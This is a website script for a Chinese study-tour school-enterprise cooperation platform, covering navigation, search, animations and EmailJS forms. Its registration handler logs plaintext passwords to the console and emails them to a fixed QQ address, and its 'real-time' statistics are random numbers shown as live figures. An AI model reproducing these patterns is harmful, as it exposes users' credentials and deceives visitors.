// 等待DOM加载完成
document.addEventListener('DOMContentLoaded', function() {
    
    // 页面加载动画控制
    const loadingScreen = document.getElementById('loading-screen');
    
    // 模拟加载时间，实际项目中可以根据资源加载情况调整
    setTimeout(() => {
        loadingScreen.classList.add('hidden');
        setTimeout(() => {
            loadingScreen.style.display = 'none';
        }, 500);
    }, 2000);
    
    // 导航栏滚动效果
    const navbar = document.querySelector('.navbar');
    const hamburger = document.querySelector('.hamburger');
    const navMenu = document.querySelector('.nav-menu');
    
    // 移除滚动时导航栏变色的JS
    // window.addEventListener('scroll', function() {
    //     if (window.scrollY > 100) {
    //         navbar.style.background = 'rgba(255, 255, 255, 0.98)';
    //         navbar.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.15)';
    //     } else {
    //         navbar.style.background = 'rgba(255, 255, 255, 0.95)';
    //         navbar.style.boxShadow = '0 2px 20px rgba(0, 0, 0, 0.1)';
    //     }
    // });
    
    // 移动端菜单切换
    hamburger.addEventListener('click', function() {
        hamburger.classList.toggle('active');
        navMenu.classList.toggle('active');
        
        // 防止页面滚动
        if (navMenu.classList.contains('active')) {
            document.body.style.overflow = 'hidden';
        } else {
            document.body.style.overflow = '';
        }
    });
    
    // 点击菜单外部关闭菜单
    document.addEventListener('click', function(e) {
        if (!hamburger.contains(e.target) && !navMenu.contains(e.target)) {
            hamburger.classList.remove('active');
            navMenu.classList.remove('active');
            document.body.style.overflow = '';
        }
    });
    
    // 窗口大小改变时关闭菜单
    window.addEventListener('resize', function() {
        if (window.innerWidth > 768) {
            hamburger.classList.remove('active');
            navMenu.classList.remove('active');
            document.body.style.overflow = '';
        }
    });
    
    // 平滑滚动到锚点
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                const offsetTop = target.offsetTop - 70; // 考虑导航栏高度
                window.scrollTo({
                    top: offsetTop,
                    behavior: 'smooth'
                });
                
                // 关闭移动端菜单
                hamburger.classList.remove('active');
                navMenu.classList.remove('active');
                document.body.style.overflow = '';
            }
        });
    });
    
    // 移动端触摸优化
    let touchStartY = 0;
    let touchEndY = 0;
    
    document.addEventListener('touchstart', function(e) {
        touchStartY = e.touches[0].clientY;
    }, { passive: true });
    
    document.addEventListener('touchend', function(e) {
        touchEndY = e.changedTouches[0].clientY;
        const touchDiff = touchStartY - touchEndY;
        
        // 向上滑动超过50px时关闭菜单
        if (navMenu.classList.contains('active') && touchDiff > 50) {
            hamburger.classList.remove('active');
            navMenu.classList.remove('active');
            document.body.style.overflow = '';
        }
    }, { passive: true });
    
    // 智能搜索功能
    const searchBtn = document.querySelector('.search-btn');
    const searchInput = document.querySelector('.search-input');
    
    // 定义搜索关键词映射
    const searchKeywords = {
        // 主要板块
        '首页': '#hero',
        '主页': '#hero',
        'home': '#hero',
        
        // 合作企业相关
        '合作企业': '#enterprises',
        '企业': '#enterprises',
        'enterprises': '#enterprises',
        '研学旅游企业': '#enterprises',
        '教育培训机构': '#enterprises',
        
        // 大学资源相关
        '大学资源': '#universities',
        '大学': '#universities',
        'universities': '#universities',
        '高校': '#universities',
        '学校': '#universities',
        '资源': '#universities',
        
        // 特色优势相关
        '特色优势': '#advantages',
        '优势': '#advantages',
        'advantages': '#advantages',
        '专业对口': '#advantages',
        '响应迅速': '#advantages',
        '长期合作': '#advantages',
        '品质保证': '#advantages',
        
        // 联系我们相关
        '联系我们': '#contact',
        '联系': '#contact',
        'contact': '#contact',
        '地址': '#contact',
        '电话': '#contact',
        '邮箱': '#contact',
        
        // 团队相关
        '团队': '#team',
        'team': '#team',
        '成员': '#team',
        '朱敏瑞': '#team',
        '任颖': '#team',
        '王玉清': '#team',
        '唐汉杰': '#team',
        
        // 合作模式相关
        '合作模式': '#cooperation',
        'cooperation': '#cooperation',
        '合作': '#cooperation',
        '校企合作': '#cooperation',
        '合作保障': '#cooperation',
        '设计成果': '#cooperation',
        
        // 注册相关
        '注册': '#join-us',
        '加入我们': '#join-us',
        '报名': '#join-us',
        'join': '#join-us',
        
        // 研学相关
        '研学': '#cooperation',
        '研学旅游': '#cooperation',
        '研学设计': '#cooperation',
        '研学规划': '#cooperation',
        '研学产品': '#cooperation',
        
        // 地理相关
        '地理': '#cooperation',
        '地理科学': '#cooperation',
        '地理专业': '#cooperation'
    };
    
    function performSearch(searchTerm) {
        const normalizedTerm = searchTerm.toLowerCase().trim();
        
        // 检查是否匹配关键词
        for (const [keyword, targetId] of Object.entries(searchKeywords)) {
            if (normalizedTerm.includes(keyword.toLowerCase()) || keyword.toLowerCase().includes(normalizedTerm)) {
                const targetElement = document.querySelector(targetId);
                if (targetElement) {
                    // 平滑滚动到目标位置
                    const offsetTop = targetElement.offsetTop - 70; // 考虑导航栏高度
                    window.scrollTo({
                        top: offsetTop,
                        behavior: 'smooth'
                    });
                    
                    // 高亮显示目标区域
                    targetElement.style.transition = 'all 0.3s ease';
                    targetElement.style.boxShadow = '0 0 20px rgba(102, 126, 234, 0.3)';
                    setTimeout(() => {
                        targetElement.style.boxShadow = '';
                    }, 2000);
                    
                    return true; // 找到匹配项
                }
            }
        }
        
        // 如果没有找到匹配项，显示开发中提示
        alert('搜索功能开发中···\n\n您可以尝试搜索以下关键词：\n• 合作企业、企业\n• 大学资源、高校\n• 特色优势、优势\n• 联系我们、联系\n• 团队、成员\n• 注册、加入我们\n• 研学、地理');
        return false;
    }
    
    searchBtn.addEventListener('click', function() {
        const searchTerm = searchInput.value.trim();
        if (searchTerm) {
            performSearch(searchTerm);
        }
    });
    
    searchInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            const searchTerm = searchInput.value.trim();
            if (searchTerm) {
                performSearch(searchTerm);
            }
        }
    });
    
    // 滚动动画
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('fade-in-up');
            }
        });
    }, observerOptions);
    
    // 观察需要动画的元素
    document.querySelectorAll('.enterprise-card, .resource-card, .achievement-card, .team-member, .advantage-item, .feature').forEach(el => {
        observer.observe(el);
    });

    // 数字动画效果
    function animateNumbers() {
        const numbers = document.querySelectorAll('.achievement-number, .stat-number');
        
        numbers.forEach(number => {
            const target = parseInt(number.textContent.replace(/\D/g, ''));
            const suffix = number.textContent.replace(/\d/g, '');
            let current = 0;
            const increment = target / 50;
            
            const timer = setInterval(() => {
                current += increment;
                if (current >= target) {
                    current = target;
                    clearInterval(timer);
                }
                number.textContent = Math.floor(current) + suffix;
            }, 30);
        });
    }

    // 当合作成果区域进入视口时触发数字动画
    const achievementsObserver = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateNumbers();
                achievementsObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });

    const achievementsSection = document.querySelector('.achievements');
    if (achievementsSection) {
        achievementsObserver.observe(achievementsSection);
    }

    // 实时数据动画效果
    function animateRealTimeStats() {
        const onlineUsers = document.getElementById('online-users');
        const todayConnections = document.getElementById('today-connections');
        const avgRating = document.getElementById('avg-rating');
        
        if (onlineUsers) {
            let currentUsers = 128;
            setInterval(() => {
                currentUsers += Math.floor(Math.random() * 3) - 1; // 随机增减
                currentUsers = Math.max(100, Math.min(150, currentUsers)); // 限制范围
                onlineUsers.textContent = currentUsers;
            }, 5000);
        }
        
        if (todayConnections) {
            let currentConnections = 15;
            setInterval(() => {
                if (Math.random() > 0.7) { // 30%概率增加
                    currentConnections++;
                    todayConnections.textContent = currentConnections;
                }
            }, 10000);
        }
        
        if (avgRating) {
            let currentRating = 4.8;
            setInterval(() => {
                const change = (Math.random() - 0.5) * 0.1; // 小幅度变化
                currentRating = Math.max(4.5, Math.min(5.0, currentRating + change));
                avgRating.textContent = currentRating.toFixed(1);
            }, 15000);
        }
    }

    // 当实时数据区域进入视口时启动动画
    const realTimeStatsObserver = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateRealTimeStats();
                realTimeStatsObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });

    const realTimeStatsSection = document.querySelector('.real-time-stats');
    if (realTimeStatsSection) {
        realTimeStatsObserver.observe(realTimeStatsSection);
    }
    
    // 返回顶部功能
    const backToTop = document.getElementById('back-to-top');
    
    window.addEventListener('scroll', function() {
        if (window.scrollY > 300) {
            backToTop.classList.add('show');
        } else {
            backToTop.classList.remove('show');
        }
    });
    
    backToTop.addEventListener('click', function() {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });

    // 初始化EmailJS
    emailjs.init('nYp4d5gouh8l_DLHV'); // 你的User ID（公钥）

    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            
            // 立即显示加载状态
            submitBtn.textContent = '发送中...';
            submitBtn.disabled = true;
            
            const name = this.querySelector('input[type="text"]').value;
            const email = this.querySelector('input[type="email"]').value;
            const phone = this.querySelector('input[type="tel"]').value;
            const message = this.querySelector('textarea').value;
            
            if (!name || !email || !phone || !message) {
                alert('请填写所有必填字段');
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
                return;
            }
            if (!isValidEmail(email)) {
                alert('请输入有效的邮箱地址');
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
                return;
            }
            
            // 1. 发送给管理员
            emailjs.send('service_m2z33go', 'template_0ek5uot', {
                name: name,
                email: email,
                phone: phone,
                message: message
            }, 'nYp4d5gouh8l_DLHV');

            // 2. 自动回复给用户
            emailjs.send('service_m2z33go', 'template_nyc8ea4', {
                name: name,
                email: email
            }, 'nYp4d5gouh8l_DLHV').then(function(response) {
                alert('消息发送成功！我们会尽快与您联系。');
                contactForm.reset();
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }, function(error) {
                alert('发送失败，请稍后再试。');
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            });
        });
    }
    
    // 注册表单处理
    const joinUsForm = document.getElementById('joinUsForm');
    console.log('查找注册表单:', joinUsForm);
    if (joinUsForm) {
        console.log('注册表单找到，添加事件监听器');
        joinUsForm.addEventListener('submit', function(e) {
            e.preventDefault();
            console.log('注册表单提交事件触发');
            
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            
            // 立即显示加载状态
            submitBtn.textContent = '注册中...';
            submitBtn.disabled = true;
            
            const name = this.querySelector('input[name="name"]').value;
            const studentid = this.querySelector('select[name="studentid"]').value;
            const account = this.querySelector('input[name="account"]').value;
            const password = this.querySelector('input[name="password"]').value;
            const phone = this.querySelector('input[name="phone"]').value;
            
            console.log('表单数据:', { name, studentid, account, password, phone });
            
            if (!name || !studentid || !account || !password || !phone) {
                alert('请填写所有必填字段');
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
                return;
            }
            
            // 发送注册信息到指定邮箱
            console.log('开始发送邮件...');
            emailjs.send('service_m2z33go', 'template_0ek5uot', {
                name: name,
                email: '1521732626@qq.com', // 固定发送到指定邮箱
                phone: phone,
                message: `新用户注册信息：
姓名：${name}
学籍：${studentid}
账号：${account}
密码：${password}
手机号：${phone}
注册时间：${new Date().toLocaleString()}`
            }, 'nYp4d5gouh8l_DLHV').then(function(response) {
                console.log('邮件发送成功:', response);
                alert('注册成功！我们会尽快审核您的信息并与您联系。');
                joinUsForm.reset();
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            }, function(error) {
                console.log('邮件发送失败:', error);
                alert('注册失败，请稍后再试。');
                submitBtn.textContent = originalText;
                submitBtn.disabled = false;
            });
        });
    }
    
    // 邮箱验证函数
    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }
    
    // 按钮点击效果
    document.querySelectorAll('.btn-secondary').forEach(btn => {
        btn.addEventListener('click', function(e) {
            // 创建涟漪效果
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            ripple.classList.add('ripple');
            
            this.appendChild(ripple);
            
            setTimeout(() => {
                ripple.remove();
            }, 600);
        });
    });
    
    // 卡片悬停效果增强
    /*
    document.querySelectorAll('.enterprise-card, .resource-card, .achievement-card, .team-member').forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-15px) scale(1.02)';
        });
        
        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });
    */
    
    // 特色优势项目悬停效果
    /*
    document.querySelectorAll('.advantage-item').forEach(item => {
        item.addEventListener('mouseenter', function() {
            this.style.transform = 'translateX(15px) scale(1.02)';
        });
        
        item.addEventListener('mouseleave', function() {
            this.style.transform = 'translateX(0) scale(1)';
        });
    });
    */
    
    // 页面加载动画
    window.addEventListener('load', function() {
        document.body.classList.add('loaded');
        
        // 主页横幅文字动画
        const heroTitle = document.querySelector('.hero h1');
        const heroSubtitle = document.querySelector('.hero h2');
        const heroText = document.querySelectorAll('.hero p');
        const heroButtons = document.querySelector('.hero-buttons');
        
        if (heroTitle) {
            setTimeout(() => heroTitle.style.opacity = '1', 300);
        }
        if (heroSubtitle) {
            setTimeout(() => heroSubtitle.style.opacity = '1', 600);
        }
        heroText.forEach((text, index) => {
            setTimeout(() => text.style.opacity = '1', 900 + index * 200);
        });
        if (heroButtons) {
            setTimeout(() => heroButtons.style.opacity = '1', 1500);
        }
    });
    
    // 添加CSS样式用于动画
    const style = document.createElement('style');
    style.textContent = `
        .hero h1, .hero h2, .hero p, .hero-buttons {
            opacity: 0;
            transition: opacity 0.8s ease;
        }
        
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: scale(0);
            animation: ripple-animation 0.6s linear;
            pointer-events: none;
        }
        
        @keyframes ripple-animation {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        .nav-menu.active {
            display: flex;
            flex-direction: column;
            position: absolute;
            top: 70px;
            left: 0;
            right: 0;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            padding: 20px;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
        }
        
        .hamburger.active span:nth-child(1) {
            transform: rotate(-45deg) translate(-5px, 6px);
        }
        
        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }
        
        .hamburger.active span:nth-child(3) {
            transform: rotate(45deg) translate(-5px, -6px);
        }
        
        body.loaded {
            opacity: 1;
        }
        
        body {
            opacity: 0;
            transition: opacity 0.5s ease;
        }
    `;
    document.head.appendChild(style);
    
    // 返回顶部按钮
    const backToTopBtn = document.createElement('button');
    backToTopBtn.innerHTML = '<i class="fas fa-arrow-up"></i>';
    backToTopBtn.className = 'back-to-top';
    backToTopBtn.style.cssText = `
        position: fixed;
        bottom: 30px;
        right: 30px;
        width: 50px;
        height: 50px;
        background: #3498db;
        color: white;
        border: none;
        border-radius: 50%;
        cursor: pointer;
        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
        z-index: 1000;
        box-shadow: 0 4px 12px rgba(52, 152, 219, 0.3);
    `;
    
    document.body.appendChild(backToTopBtn);
    
    // 显示/隐藏返回顶部按钮
    window.addEventListener('scroll', function() {
        if (window.scrollY > 300) {
            backToTopBtn.style.opacity = '1';
            backToTopBtn.style.visibility = 'visible';
        } else {
            backToTopBtn.style.opacity = '0';
            backToTopBtn.style.visibility = 'hidden';
        }
    });
    
    // 返回顶部功能
    backToTopBtn.addEventListener('click', function() {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
    
    // 悬停效果
    backToTopBtn.addEventListener('mouseenter', function() {
        this.style.background = '#2980b9';
        this.style.transform = 'translateY(-3px)';
    });
    
    backToTopBtn.addEventListener('mouseleave', function() {
        this.style.background = '#3498db';
        this.style.transform = 'translateY(0)';
    });
    

    
    console.log('研学设计校企合作平台已加载完成！');
}); 